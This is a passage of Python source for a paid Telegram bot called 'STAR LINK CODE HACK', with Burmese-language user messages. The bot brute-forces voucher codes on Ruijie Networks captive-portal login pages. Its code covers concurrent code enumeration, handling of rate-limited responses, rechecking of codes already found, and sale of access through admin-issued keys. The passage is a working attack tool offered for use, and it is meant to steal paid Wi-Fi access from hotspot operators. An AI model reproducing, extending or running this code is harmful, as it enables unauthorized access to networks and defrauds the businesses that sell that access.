            self.db.add_success_code(str(chat_id), code, session_id, plan_info)

            # Store in memory
            self.success_texts.setdefault(chat_id, []).append({
                "code": code,
                "session_id": session_id,
                "plan": plan_info
            })
            log.info(f"FOUND code={code} plan={plan_info} chat_id={chat_id}")

            # Notify user
            if message and self.notify_setting.get(chat_id, DEFAULT_NOTIFY):
                try:
                    codes_display = self.user_data.get(chat_id, {}).get('current_display_codes', [])
                    code_entry = f"🎫 {code}\n   {plan_info}"
                    codes_display.append(code_entry)
                    code_line = "\n\n".join(codes_display)

                    if chat_id not in self.success_messages or len(code_line) > 4000:
                        sent = await self.bot.send_message(
                            chat_id,
                            f"✅ *Success Codes:*\n\n{code_entry}",
                            parse_mode="Markdown"
                        )
                        self.success_messages[chat_id] = sent.message_id
                        self.user_data.setdefault(chat_id, {})['current_display_codes'] = [code_entry]
                    else:
                        try:
                            await self.bot.edit_message_text(
                                f"✅ *Success Codes:*\n\n{code_line}",
                                chat_id=chat_id,
                                message_id=self.success_messages[chat_id],
                                parse_mode="Markdown"
                            )
                            self.user_data.setdefault(chat_id, {})['current_display_codes'] = codes_display
                        except Exception:
                            sent = await self.bot.send_message(
                                chat_id,
                                f"✅ *Success Codes:*\n\n{code_entry}",
                                parse_mode="Markdown"
                            )
                            self.success_messages[chat_id] = sent.message_id
                            self.user_data.setdefault(chat_id, {})['current_display_codes'] = [code_entry]
                except Exception as e:
                    log.error(f"Success message error: {e}")
            return code

        # ── RATE LIMITED ──
        if 'STA' in response:
            self.db.add_limited_code(str(chat_id), code)
            self.limited_texts.setdefault(chat_id, []).append(code)
            if message and self.notify_setting.get(chat_id, DEFAULT_NOTIFY):
                try:
                    limited_line = "\n".join(self.limited_texts[chat_id])
                    if chat_id not in self.limited_messages:
                        sent = await self.bot.send_message(
                            chat_id,
                            f"⚠️ *Limited Codes:*\n\n{limited_line}",
                            parse_mode="Markdown"
                        )
                        self.limited_messages[chat_id] = sent.message_id
                    else:
                        try:
                            await self.bot.edit_message_text(
                                f"⚠️ *Limited Codes:*\n\n{limited_line}",
                                chat_id=chat_id,
                                message_id=self.limited_messages[chat_id],
                                parse_mode="Markdown"
                            )
                        except Exception:
                            sent = await self.bot.send_message(
                                chat_id,
                                f"⚠️ *Limited Codes:*\n\n{limited_line}",
                                parse_mode="Markdown"
                            )
                            self.limited_messages[chat_id] = sent.message_id
                except Exception as e:
                    log.error(f"Limited message error: {e}")

        return None

    # ─────────────────────────────────────────────────────────────────────────
    # Scan Runner
    # ─────────────────────────────────────────────────────────────────────────
    async def run_bruteforce(self, chat_id: int, state: ScanState, progress_msg):
        session_url = self.user_data.get(chat_id, {}).get("session_url")
        if not session_url:
            await self.bot.send_message(chat_id, "❌ Portal URL မရှိပါ။ `/setup` လုပ်ပါ။", parse_mode="Markdown")
            return

        try:
            code_iter = self.iter_codes(state.mode, start_digit=state.start_digit)
        except ValueError as e:
            await self.bot.send_message(chat_id, str(e))
            return

        total = self.known_total(state.mode, state.length)
        checked = 0
        found = 0
        scan_start = time.monotonic()
        user_stopped = False

        try:
            while True:
                current_state = self.scan_tasks.get(chat_id)
                if not current_state or current_state.scan_id != state.scan_id:
                    return
                if current_state.stop:
                    user_stopped = True
                    self.last_scan_params[chat_id] = {
                        "mode": state.mode,
                        "length": state.length,
                        "target": state.target,
                        "plan_filters": state.plan_filters,
                        "start_digit": state.start_digit,
                    }
                    return

                batch = []
                for _ in range(BATCH_SIZE):
                    try:
                        batch.append(next(code_iter))
                    except StopIteration:
                        break
                if not batch:
                    break

                sem = asyncio.Semaphore(CONCURRENCY)

                async def _check(code):
                    async with sem:
                        return await self.perform_check(
                            session_url, code, chat_id, state.scan_id,
                            message=None, plan_filters=state.plan_filters
                        )

                results = await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)

                for res in results:
                    if isinstance(res, str):
                        found += 1
                        if state.target and found >= state.target:
                            user_stopped = True
                            await self.bot.edit_message_text(
                                "🎯 Target ရောက်ပြီ! Scan ပြီးပါပြီ။",
                                chat_id=chat_id,
                                message_id=progress_msg.message_id,
                            )
                            return

                checked += len(batch)
                elapsed = time.monotonic() - scan_start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0

                text = self.format_progress(checked, total, speed, found)
                try:
                    await self.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=text
                    )
                except Exception:
                    try:
                        new_msg = await self.bot.send_message(chat_id, text)
                        progress_msg.message_id = new_msg.message_id
                    except Exception:
                        pass

            # Finished
            finish_text = (
                f"🔍 Scanning Completed\n\n"
                f"📦 Checked: {checked:,}\n"
                f"✅ Success: {found}\n"
                f"📊 Progress: 100%"
            )
            try:
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except Exception:
                await self.bot.send_message(chat_id, finish_text)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error(f"run_bruteforce error: {e}")
        finally:
            self.scan_tasks.pop(chat_id, None)
            if not user_stopped:
                self.last_scan_params.pop(chat_id, None)
            async with self.active_scans_lock:
                self.active_scans_count = max(0, self.active_scans_count - 1)
            await self.send_success_file(chat_id)

    async def send_success_file(self, chat_id: int):
        codes = self.success_texts.get(chat_id, [])
        if not codes:
            return
        try:
            filename = f"success_{chat_id}_{int(time.time())}.txt"
            content = "\n".join([f"{i['code']} - {i.get('plan','N/A')}" for i in codes])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            with open(filename, "rb") as f:
                await self.bot.send_document(chat_id, f, caption="✅ Success Codes")
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            log.error(f"Error sending file: {e}")

    async def start_scan(self, chat_id: int, mode, length: Optional[int], target: Optional[int],
                        message, plan_filters: List[str] = None, start_digit: Optional[str] = None):
        # Rate limit check
        if not self.is_admin(chat_id):
            if not await self.check_rate_limit(chat_id, "scan", RATE_LIMIT_SCANS_PER_HOUR):
                await self.bot.reply_to(message, "⚠️ သင်သည် တစ်နာရီအတွင်း Scan ၃ ကြိမ်သာ လုပ်နိုင်ပါသည်။")
                return

        async with self.active_scans_lock:
            if self.active_scans_count >= MAX_CONCURRENT_SCANS:
                await self.bot.reply_to(message, f"⚠️ Bot အလုပ်များနေပါသည်။ လက်ရှိ {self.active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။")
                return
            self.active_scans_count += 1

        plan_filters = plan_filters or []
        pf_str = f" | Plan: {'/'.join(plan_filters)}" if plan_filters else ""
        tgt_str = f" | Target: {target}" if target else ""

        prog = await self.bot.send_message(
            chat_id,
            f"🚀 *Scan Started*\n"
            f"📏 Mode: `{mode}` | Length: `{length}`{tgt_str}{pf_str}\n\n"
            "⏳ ရှာဖွေနေပါသည်...",
            parse_mode="Markdown",
        )

        state = ScanState(
            chat_id=str(chat_id),
            mode=mode,
            length=length,
            target=target,
            plan_filters=plan_filters,
            start_digit=start_digit,
        )
        self.scan_tasks[chat_id] = state

        task = asyncio.create_task(
            self.run_bruteforce(chat_id, state, prog)
        )
        state.task = task

        # Clean up success/limited messages
        self.success_messages.pop(chat_id, None)
        self.limited_messages.pop(chat_id, None)

        # Notify admins
        try:
            user_name = message.from_user.first_name or message.from_user.username or "User"
            portal_url = self.user_data.get(chat_id, {}).get('session_url', 'Unknown')
            admin_msg = (
                f"🚀 **Scan Started**\n\n"
                f"👤 User: {user_name}\n"
                f"🆔 ID: `{chat_id}`\n"
                f"🔢 Mode: {mode}\n"
                f"🔗 URL: `{portal_url[:100]}`"
            )
            for admin_id in ADMINS:
                try:
                    await self.bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
                except Exception:
                    pass
        except Exception:
            pass

    # ─────────────────────────────────────────────────────────────────────────
    # Bot Command Handlers
    # ─────────────────────────────────────────────────────────────────────────

    # ─── /start ──────────────────────────────────────────────────────────────
    async def cmd_start(self, message):
        chat_id = message.chat.id
        user_id = str(chat_id)
        user_name = message.from_user.first_name or message.from_user.username or "User"

        await self.ensure_user(chat_id)
        is_paid = self.is_paid_or_approved(chat_id)

        if is_paid:
            self.db.upsert_user(user_id, is_approved=1)
            welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
        else:
            welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။
👨‍💻 Admin: {ADMIN_USERNAME}"""

        await self.bot.send_message(chat_id, welcome_text, reply_markup=self.get_main_keyboard())

    # ─── /setup ─────────────────────────────────────────────────────────────
    async def cmd_setup(self, message):
        chat_id = message.chat.id
        user_id = str(chat_id)

        if not self.is_paid_or_approved(chat_id) and not self.is_admin(chat_id):
            await self.bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await self.bot.reply_to(
                message,
                "🔗 Portal URL ထည့်သွင်းရန်:\n\n"
                "`/setup [your_portal_url]`\n\n"
                "✅ Session URL (sessionId ပါတဲ့ URL):\n"
                "`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?...&sessionId=xxx`\n\n"
                "✅ WiFiDog URL (auto-resolve လုပ်ပေးပါမည်):\n"
                "`https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&...`",
                parse_mode="Markdown"
            )
            return

        url = args[1].strip()
        await self.ensure_user(chat_id)

        is_wifidog = "wifidog" in url or "stage=portal" in url

        if is_wifidog:
            pm = await self.bot.reply_to(message, "🔍 WiFiDog URL တွေ့ပါပြီ။ Session URL အဖြစ် ပြောင်းနေပါသည်...")
            resolved_url = await self.resolve_wifidog_url(url)

            if resolved_url:
                self.user_data[chat_id]['session_url'] = resolved_url
                self.db.upsert_user(str(chat_id), session_url=resolved_url)
                session_id = resolved_url.split('sessionId=')[-1] if 'sessionId=' in resolved_url else 'N/A'
                await self.bot.edit_message_text(
                    "✅ WiFiDog URL ကို Session URL အဖြစ် ပြောင်းပြီးပါပြီ!\n"
                    f"📋 Session ID: `{session_id}`\n\n"
                    "VOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
                    chat_id=chat_id,
                    message_id=pm.message_id,
                    reply_markup=self.get_voucher_keyboard(),
                    parse_mode="Markdown"
                )
            else:
                await self.bot.edit_message_text(
                    "❌ WiFiDog URL ကို resolve လုပ်မရပါ။\n"
                    "Session URL (sessionId ပါတဲ့ URL) ကို တိုက်ရိုက်ပို့ပါ။",
                    chat_id=chat_id,
                    message_id=pm.message_id
                )
            return

        pm = await self.bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")

        if await self.check_session_url(url):
            self.user_data[chat_id]['session_url'] = url
            self.db.upsert_user(str(chat_id), session_url=url)
            await self.bot.edit_message_text(
                "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
                chat_id=chat_id,
                message_id=pm.message_id,
                reply_markup=self.get_voucher_keyboard()
            )
        else:
            await self.bot.edit_message_text(
                f"❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။",
                chat_id=chat_id,
                message_id=pm.message_id
            )

    # ─── /brute ─────────────────────────────────────────────────────────────
    async def cmd_brute(self, message):
        args = message.text.split()
        chat_id = message.chat.id
        user_id = str(chat_id)

        if not self.is_paid_or_approved(chat_id) and not self.is_admin(chat_id):
            await self.bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။")
            return

        if len(args) < 3:
            await self.bot.reply_to(
                message,
                "❗ `/brute <mode> <length> [target] [plan...]`\n\n"
                "ဥပမာ: `/brute 1 6 5`",
                parse_mode="Markdown",
            )
            return

        try:
            mode = int(args[1])
            length = int(args[2])
        except ValueError:
            await self.bot.reply_to(message, "Mode နှင့် Length သည် ဂဏန်းဖြစ်ရမည်။")
            return

        if mode not in CHARSETS:
            await self.bot.reply_to(message, "Mode 1–5 ပေးပါ:\n`1`=ဂဏန်း  `2`=အသေး  `3`=အကြီး  `4`=၂မျိုး  `5`=စာ+ဂဏန်း", parse_mode="Markdown")
            return

        if not 1 <= length <= 12:
            await self.bot.reply_to(message, "Length: 1–12 ထည့်ပါ။")
            return

        if chat_id not in self.user_data or not self.user_data[chat_id].get('session_url'):
            await self.bot.reply_to(message, "❗ `/setup <url>` ဦးဆုံးလုပ်ပါ။", parse_mode="Markdown")
            return

        target = None
        plan_filters = []
        idx = 3

        if idx < len(args) and not PLAN_RE.match(args[idx]):
            try:
                target = int(args[idx])
                idx += 1
            except ValueError:
                await self.bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရမည်။")
                return

        for a in args[idx:]:
            if PLAN_RE.match(a):
                plan_filters.append(a)
            else:
                await self.bot.reply_to(message, f"'{a}' plan ပုံစံမမှန်ပါ။\nဥပမာ: `30min` `1h` `1d` `1mo` `unlimit`", parse_mode="Markdown")
                return

        # Resume check
        if chat_id in self.last_scan_params:
            prev = self.last_scan_params[chat_id]
            pf_str = "/".join(prev.get("plan_filters") or []) or "ဘာမဆို"
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton("▶️ ပြန်ဆက်ရှာ", callback_data="resume_scan"),
                InlineKeyboardButton("🆕 အသစ်စတင်", callback_data="new_scan"),
            )
            self.pending_brute[chat_id] = {
                "mode": mode, "length": length,
                "target": target, "plan_filters": plan_filters,
            }
            await self.bot.reply_to(
                message,
                f"⏸ ယခင် scan ရပ်ထားသည်\n"
                f"Mode `{prev['mode']}` | Len `{prev['length']}` | Target `{prev['target']}` | Plan `{pf_str}`\n\n"
                "ဘာလုပ်မလဲ?",
                reply_markup=markup, parse_mode="Markdown",
            )
            return

        await self.start_scan(chat_id, mode, length, target, message, plan_filters)

    # ─── /scan ──────────────────────────────────────────────────────────────
    async def cmd_scan(self, message):
        args = message.text.split(maxsplit=1)
        chat_id = message.chat.id
        user_id = str(chat_id)

        if not self.is_paid_or_approved(chat_id) and not self.is_admin(chat_id):
            await self.bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။")
            return

        if len(args) < 2:
            await self.bot.reply_to(
                message,
                "VOUCHER ရွေးချယ်ရန်:\n\n/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
                reply_markup=self.get_voucher_keyboard()
            )
            return

        mode = args[1]

        if chat_id not in self.user_data or not self.user_data[chat_id].get('session_url'):
            await self.bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။\n\n/portal [url]")
            return

        if chat_id in self.scan_tasks and self.scan_tasks[chat_id].task and not self.scan_tasks[chat_id].task.done():
            await self.bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAN ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
            return

        await self.start_scan(chat_id, mode, None, None, message)

    # ─── /stop ──────────────────────────────────────────────────────────────
    async def cmd_stop(self, message):
        chat_id = message.chat.id
        state = self.scan_tasks.get(chat_id)
        if state and state.task and not state.task.done():
            state.stop = True
            state.task.cancel()
            await self.send_success_file(chat_id)
            self.success_messages.pop(chat_id, None)
            self.success_texts.pop(chat_id, None)
            self.limited_messages.pop(chat_id, None)
            self.limited_texts.pop(chat_id, None)
            await self.bot.reply_to(
                message,
                "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။\n`/resume` ဖြင့် ပြန်စနိုင်သည်။",
                reply_markup=self.get_back_keyboard(),
                parse_mode="Markdown"
            )
        else:
            await self.bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=self.get_back_keyboard())

    # ─── /resume ────────────────────────────────────────────────────────────
    async def cmd_resume(self, message):
        chat_id = message.chat.id
        if chat_id not in self.last_scan_params:
            await self.bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
            return
        p = self.last_scan_params.pop(chat_id)
        await self.bot.reply_to(message, "▶️ ပြန်ဆက်ရှာပါမည်...")
        await self.start_scan(
            chat_id,
            p.get("mode"),
            p.get("length"),
            p.get("target"),
            message,
            p.get("plan_filters", []),
            p.get("start_digit")
        )

    # ─── /saved ─────────────────────────────────────────────────────────────
    async def cmd_saved(self, message):
        chat_id = message.chat.id
        user_id = str(chat_id)

        if not self.is_paid_or_approved(chat_id) and not self.is_admin(chat_id):
            await self.bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။")
            return

        # Get from DB
        success_codes = self.db.get_success_codes(user_id)
        limited_codes = self.db.get_limited_codes(user_id)

        if not success_codes and not limited_codes:
            await self.bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
            return

        parts = []
        if success_codes:
            parts.append(f"✅ *Success Codes* ({len(success_codes)})")
            parts += [f"`{i['code']}` – ⏳ {i.get('plan','N/A')}" for i in success_codes[:50]]
            if len(success_codes) > 50:
                parts.append(f"... နှင့် {len(success_codes)-50} ခု ထပ်ရှိသည်။")
        if limited_codes:
            parts.append(f"\n⚠️ *Limited Codes* ({len(limited_codes)})")
            parts += [f"`{c}`" for c in limited_codes[:20]]
            if len(limited_codes) > 20:
                parts.append(f"... နှင့် {len(limited_codes)-20} ခု ထပ်ရှိသည်။")

        txt = "\n".join(parts)
        if len(txt) <= 4096:
            await self.bot.reply_to(message, txt, parse_mode="Markdown")
        else:
            for i in range(0, len(txt), 4096):
                await self.bot.send_message(chat_id, txt[i:i+4096], parse_mode="Markdown")

    # ─── /notify ────────────────────────────────────────────────────────────
    async def cmd_notify(self, message):
        chat_id = message.chat.id
        self.notify_setting[chat_id] = not self.notify_setting.get(chat_id, DEFAULT_NOTIFY)
        self.db.upsert_user(str(chat_id), notify=1 if self.notify_setting[chat_id] else 0)
        st = "ON 🔔" if self.notify_setting[chat_id] else "OFF 🔕"
        await self.bot.reply_to(message, f"Notification: *{st}*", parse_mode="Markdown")

    # ─── /recheck ───────────────────────────────────────────────────────────
    async def cmd_recheck(self, message):
        chat_id = message.chat.id
        user_id = str(chat_id)

        if not self.is_paid_or_approved(chat_id) and not self.is_admin(chat_id):
            await self.bot.reply_to(message, f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။")
            return

        if chat_id not in self.user_data or not self.user_data[chat_id].get('session_url'):
            await self.bot.reply_to(message, "❗ `/setup <url>` ဦးဆုံးလုပ်ပါ။", parse_mode="Markdown")
            return

        # Get from DB
        success_codes = self.db.get_success_codes(user_id)
        if not success_codes:
            await self.bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
            return

        pm = await self.bot.reply_to(message, f"🔍 {len(success_codes)} codes စစ်ဆေးနေပါသည်...")
        new_succ = []
        session_url = self.user_data[chat_id]['session_url']

        for item in success_codes:
            res = await self.perform_check(
                session_url,
                item["code"],
                chat_id,
                recheck=True,
                message=message,
            )
            if res:
                new_succ.append(item)

        if new_succ:
            lines = "\n".join(f"`{i['code']}` – {i.get('plan','N/A')}" for i in new_succ)
            await self.bot.edit_message_text(
                f"✅ Valid codes ({len(new_succ)}):\n{lines}",
                chat_id=chat_id,
                message_id=pm.message_id,
                parse_mode="Markdown"
            )
        else:
            await self.bot.edit_message_text(
                "✅ Recheck ပြီး — valid code မကျန်ပါ။",
                chat_id=chat_id,
                message_id=pm.message_id,
            )

    # ─── /status ────────────────────────────────────────────────────────────
    async def cmd_status(self, message):
        if not self.is_admin(message.chat.id):
            await self.bot.reply_to(message, "❌ No Permission")
            return
        active = sum(1 for s in self.scan_tasks.values() if s.task and not s.task.done())
        up = int(time.monotonic() - self._start_time)
        h, r = divmod(up, 3600)
        m, s = divmod(r, 60)
        total_found = sum(len(v) for v in self.success_texts.values())
        approved = len([u for u in self.user_data.values() if u.get("paid") or u.get("approved")])
        await self.bot.reply_to(
            message,
            f"📊 *Bot Status*\n\n"
            f"⏱ Uptime: `{h}h {m}m {s}s`\n"
            f"🔍 Active Scans: `{active}`\n"
            f"👥 Sessions: `{len(self.user_data)}`\n"
            f"✅ PAID Users: `{approved}`\n"
            f"💎 Total Found: `{total_found}`",
            parse_mode="Markdown",
        )

    # ─── /help ──────────────────────────────────────────────────────────────
    async def cmd_help(self, message):
        await self.bot.reply_to(
            message,
            "📚 *Command လမ်းညွှန်*\n\n"
            "━━ *Setup* ━━\n"
            "`/setup <url>`\n"
            "  - Session URL (sessionId ပါတဲ့ URL)\n"
            "  - WiFiDog URL (auto-resolve လုပ်ပေးပါမည်)\n\n"
            "━━ *Scan* ━━\n"
            "`/brute <mode> <length> [target] [plan...]`\n"
            "  Mode: `1`=ဂဏန်း `2`=အသေး `3`=အကြီး `4`=၂မျိုး `5`=စာ+ဂဏန်း\n"
            "`/scan <mode>`\n"
            "  Modes: `6,7,8,9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9`\n\n"
            "━━ *Control* ━━\n"
            "`/stop` — Scan ရပ်ရန်\n"
            "`/resume` — Scan ပြန်စရန်\n"
            "`/saved` — ရလဒ်ကြည့်ရန်\n"
            "`/notify` — Notification ON/OFF\n"
            "`/recheck` — Success codes ပြန်စစ်ရန်\n"
            "`/status` — Bot status (Admin)",
            parse_mode="Markdown",
        )

    # ─── Admin Commands ────────────────────────────────────────────────────

    async def cmd_genkey(self, message):
        if not self.is_admin(message.chat.id):
            await self.bot.reply_to(message, "No Permission")
            return

        # Generate OTP
        otp = self.generate_otp(str(message.chat.id), "genkey")
        await self.bot.reply_to(
            message,
            f"🔐 *OTP Verification Required*\n\n"
            f"ကျေးဇူးပြု၍ OTP ကုဒ်ကို ထည့်သွင်းပါ:\n"
            f"`{otp}`\n\n"
            f"OTP သက်တမ်း: ၂ မိနစ်\n\n"
            f"ထပ်မံအတည်ပြုရန်:\n"
            f"`/verify_otp <otp> genkey unlimited 123456789`",
            parse_mode="Markdown"
        )
        self.db.log_admin_action(str(message.chat.id), "genkey_otp_sent")

    async def cmd_verify_otp(self, message):
        args = message.text.split()
        if len(args) < 4:
            await self.bot.reply_to(message, "Usage: `/verify_otp <otp> genkey unlimited 123456789`", parse_mode="Markdown")
            return

        otp = args[1]
        action = args[2]
        action_parts = args[3:]

        verified_action = self.verify_otp(str(message.chat.id), otp)
        if not verified_action:
            await self.bot.reply_to(message, "❌ OTP မှားယွင်းနေသည် သို့မဟုတ် သက်တမ်းကုန်သွားပါပြီ။")
            return

        if verified_action == "genkey":
            try:
                plan = action_parts[0]
                user_id = action_parts[1]
                expiry = self.generate_expiry(plan)
                if not expiry:
                    await self.bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
                    return
                # Update DB
                auth_list, sha = await self.get_file_content("auth_list.json")
                auth_list[user_id] = {"expires_at": expiry, "plan": plan}
                await self.update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
                self.db.upsert_user(user_id, is_paid=1, is_approved=1)
                self.db.log_admin_action(str(message.chat.id), "genkey", f"user={user_id} plan={plan}")
                await self.bot.reply_to(
                    message,
                    f"✅ Key Generated\n\nUSER ID: {user_id}\nPLAN: {plan}\nEXPIRES: {expiry}"
                )
            except Exception as e:
                log.error(f"genkey error: {e}")
                await self.bot.reply_to(message, f"❌ Error: {e}")

    # ─── /sendall with rate limit ──────────────────────────────────────────
    async def cmd_sendall(self, message):
        if not self.is_admin(message.chat.id):
            await self.bot.reply_to(message, "No Permission")
            return

        # Rate limit
        if not await self.check_rate_limit(message.chat.id, "broadcast", RATE_LIMIT_BROADCAST_PER_HOUR):
            await self.bot.reply_to(message, "⚠️ Broadcast ကို တစ်နာရီ ၁ ကြိမ်သာ ပို့နိုင်ပါသည်။")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await self.bot.reply_to(message, "Usage: /sendall [your_message]")
            return

        broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
        auth_list, _ = await self.get_file_content("auth_list.json")
        count = 0
        for uid in auth_list:
            try:
                await self.bot.send_message(int(uid), broadcast_text)
                count += 1
                await asyncio.sleep(0.1)
            except Exception:
                continue
        self.db.log_admin_action(str(message.chat.id), "sendall", f"users={count}")
        await self.bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")

    # ─── /delkey ────────────────────────────────────────────────────────────
    async def cmd_delkey(self, message):
        if not self.is_admin(message.chat.id):
            await self.bot.reply_to(message, "No Permission")
            return

        otp = self.generate_otp(str(message.chat.id), "delkey")
        await self.bot.reply_to(
            message,
            f"🔐 *OTP Required*\n\n"
            f"OTP: `{otp}`\n"
            f"အတည်ပြုရန်: `/verify_otp <otp> delkey <user_id>`",
            parse_mode="Markdown"
        )

    # ─── /listkeys ──────────────────────────────────────────────────────────
    async def cmd_listkeys(self, message):
        if not self.is_admin(message.chat.id):
            await self.bot.reply_to(message, "No Permission")
            return
        try:
            auth_list, _ = await self.get_file_content("auth_list.json")
            if not auth_list:
                await self.bot.reply_to(message, "Registered key မရှိသေးပါ။")
                return
            lines = []
            for uid, data in auth_list.items():
                if isinstance(data, dict):
                    expires = data.get("expires_at", "unknown")
                    plan = data.get("plan", "unknown")
                    if expires == "9999-12-31T23:59:59Z":
                        expires_str = "Unlimited"
                    else:
                        try:
                            exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                            now = datetime.now(timezone.utc)
                            if exp_dt < now:
                                expires_str = "Expired"
                            else:
                                diff = exp_dt - now
                                days = diff.days
                                hours, rem = divmod(diff.seconds, 3600)
                                minutes = rem // 60
                                expires_str = f"{days}d {hours}h {minutes}m left"
                        except Exception:
                            expires_str = expires
                else:
                    plan = "old"
                    expires_str = str(data)
                lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
            text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
            if len(text) > 4096:
                for i in range(0, len(text), 4096):
                    await self.bot.send_message(message.chat.id, text[i:i+4096])
            else:
                await self.bot.reply_to(message, text)
        except Exception as e:
            log.error(f"listkeys error: {e}")
            await self.bot.reply_to(message, f"❌ Error: {e}")

    # ─── Callback Handlers ─────────────────────────────────────────────────

    async def callback_handler(self, call):
        chat_id = call.message.chat.id
        user_id = str(chat_id)
        user_name = call.from_user.first_name or call.from_user.username or "User"

        if call.data == "menu_back":
            if self.is_paid_or_approved(chat_id):
                text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access"""
            else:
                text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"""
            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=self.get_main_keyboard()
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_free_trial":
            if not self.is_paid_or_approved(chat_id):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return
            text = f"""🔗 Portal URL ထည့်သွင်းရန်:

/setup [your_portal_url]

ဥပမာ:
/setup https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
            await self.bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=self.get_back_keyboard()
            )
            await self.bot.answer_callback_query(call.id)
            return

        if call.data == "menu_start_scam":
            if not self.is_paid_or_approved(chat_id):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    reply_markup=self.get_back_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            if chat_id not in self.user_data or 'selected_mode' not in self.user_data.get(chat_id, {}):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                    reply_markup=self.get_voucher_keyboard()
                )
                await self.bot.answer_callback_query(call.id)
                return

            mode = self.user_data[chat_id]['selected_mode']
            start_digit = self.user_data[chat_id].get('start_digit')

            if chat_id not in self.user_data or 'session_url' not in self.user_data.get(chat_id, {}):
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
